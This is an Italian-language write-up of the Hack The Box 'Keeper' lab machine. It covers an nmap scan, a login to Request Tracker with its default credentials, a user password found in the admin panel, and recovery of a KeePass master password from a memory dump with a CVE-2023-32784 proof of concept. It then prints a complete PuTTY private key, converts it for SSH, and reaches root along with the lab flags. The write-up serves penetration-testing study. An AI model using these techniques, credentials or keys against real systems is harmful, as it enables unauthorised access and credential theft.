**TARGET: 10.10.11.227**

# INFORMATION GATHERING

Per prima cosa lanciamo un rapido scan con [Nmap](Note/Tool/Nmap.md) per vedere quali porte e quali servizi girano 
```bash
┌──(root㉿kali)-[/home/kali/htb/keeper]
└─# nmap -sV -sC --min-rate=5000 10.10.11.227
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 16:17 EDT
Nmap scan report for 10.10.11.227
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.78 seconds

```

Un scan approfondito su tutte le porte non ci da nessun nuovo risultato 

Abbiamo solo 2 porte aperte 

- 22 SSH OpenSSH 8.9p1 ( le versioni con vulnerabilità note sono più vecchie )
- 80 http nginx 1.18.0

# ENUMERATION

## Port 80

Iniziamo visitando http://10.10.11.227:80
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Keeper.png)
Ci rimanda alla pagina http://tickets.keeper.htb/rt/ per l'apertura di un ticket di supporto IT

Per prima cosa aggiungiamo `tickets.keeper.htb` al nostro `etc/hosts` visto che abbiamo trovato quello che sembra essere un VHOST

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/keeper1.png)Visitando http://tickets.keeper.htb/rt/ siamo di fronte ad un prompt di login 
e vediamo che il software si chiamo RT 4.4.4+dfsg-2ubuntu1 

Cercando su google per  le credenziali di default troviamo [questa](https://rt-wiki.bestpractical.com/wiki/RecoverRootPassword#:~:text=The%20topic%20of%20recovering%20root,of%20your%20Unix%20root%20user.) pagina dove vediamo che le credenziali sono 

- root
- password

le proviamo e siamo dentro 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/keeper2.png)
Guardando nel tab Admin alla sezione User troviamo oltre all'utente root anche l'utente  lnorgaard
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/keeper3.png)Se apriamo lnorgaard troviamo quelle che sembrano delle credenziali 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/keeper4.png)Ora abbiamo delle credenziali complete 
user:  lnorgaard
passwd: Welcome2023!

Non ci resta che provarle tramite [Ssh](CHEATSHEETS/Tunneling/Ssh.md) visto che ì l'unico servizio attivo 

```bash
┌──(root㉿kali)-[/home/kali/htb/keeper]
└─# ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Sat Nov  4 21:40:18 2023 from 10.10.14.32
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
lnorgaard@keeper:~$
```

E ci prendiamo la nostra user_flag

```bash
lnorgaard@keeper:~$ cat user.txt
f562269f1eeb0cf0cdc7a4ee8254894b
```

# PRIVESC

Vediamo che oltre alla user_flag abbiamo un file .zip
```bash
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
```

lo scarichiamo sulla nostra macchina e lo estraiamo 

```bash
┌──(root㉿kali)-[/home/kali/htb/keeper]
└─# unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp
 extracting: passcodes.kdbx
```

Abbiamo due file `KeePassDumpFull.dmp` e `passcodes.kdbx

Cercando su goole per le vunerabiltà di keepass e come leggere il file.dump trovo riferimenti alla [CVE 2023-32784](https://cyberment.it/vulnerabilita-informatiche/cve-2023-32784-le-vulnerabilita-nei-password-manager-sono-una-realta/)[questa](https://github.com/CMEPW/keepass-dump-masterkey) pagina git dove abbiamo un tool per estralla

Scarichiamo il tool e lo eseguiamo 
```bash
┌──(root㉿kali)-[/home/kali/htb/keeper]
└─# python3 poc.py -d KeePassDumpFull.dmp
2023-11-04 17:27:19,054 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

Otteniamo queste password ma non sono molto chiare, proviamo a fare una ricerca per queste stringe 
più risultati ci ridanno la parola  `Rødgrød Med Fløde` che sia la password?

Apriamo keepass2 sulla nostra macchina e proviamo a legger il file `passcodes.kdbx`
>[!nota] Se non abbiamo keepass2 lo installiamo con il comando `sudo apt install keepass2`

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/keeper5.png)
e digitiamo `rødgrød med fløde` ( la passowrd è con le iniziali minuscole)

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/keeper6.png)Abbiamo due file. Quello interessante è il primo `keepr.htb` aperto da root che sembra contenere una chiava id_rsa
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/keeper7.png)
Notiamo che queste non sono nel solito formato ma sono nel formato PuttY

Cerando sempre su google come conetterci in ssh con credenziali Putty trovo [questa](https://askubuntu.com/questions/818929/login-ssh-with-ppk-file-on-ubuntu-terminal?source=post_page-----89d93fbff84b--------------------------------) discussione 

Sostanzialmente  KeePass ci ha fornito la chiave RSA SSH.
Dobbiamo utilizzarla come contenuto per il file ".ppk". a questo punto dobbiamo utilizzare puttygen per creare un file .pam  partendo dal file .ppk creato in precedenza

Ci creiamo il nostro file `key.ppk`

```bash
┌──(root㉿kali)-[/home/kali/htb/keeper]
└─# nano key.ppk
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

Utilizziamo puttygen per ricavare il file .pam

```
┌──(root㉿kali)-[/home/kali/htb/keeper]
└─# puttygen key.ppk -O private-openssh -o id_key.pam
```

Gli diamo i permessi di lettura

```
┌──(root㉿kali)-[/home/kali/htb/keeper]
└─# chmod 400 id_key.pam
```

Ci colleghiamo e prediamo la nostra root_flag
```bash
┌──(root㉿kali)-[/home/kali/htb/keeper]
└─# ssh root@10.10.11.227 -i id_key.pam
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
root@keeper:~# cat /root/root.txt
8f394dfe47ff0f57fc617551a2605bf1
```